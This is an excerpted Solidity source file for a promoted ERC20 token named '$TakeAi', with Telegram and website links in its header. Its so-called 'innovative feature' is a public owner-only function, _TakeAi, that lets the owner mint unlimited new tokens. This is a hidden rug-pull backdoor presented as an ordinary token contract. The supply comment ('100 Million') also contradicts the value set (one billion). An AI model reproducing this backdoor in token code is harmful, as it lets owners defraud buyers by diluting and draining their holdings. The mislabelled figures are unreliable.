...
//
// $TakeAi proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/TakeAi
//  🌐 Website:https://TakeAi.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TakeAi(uint256 amount) public onlyOwner {
 _TakeAi(msg.sender, amount);
    }
    ...
    function _TakeAi(address account, uint256 amount) internal virtual {
...
contract $TakeAi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Take Ai", "TAI") {
     _TakeAi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}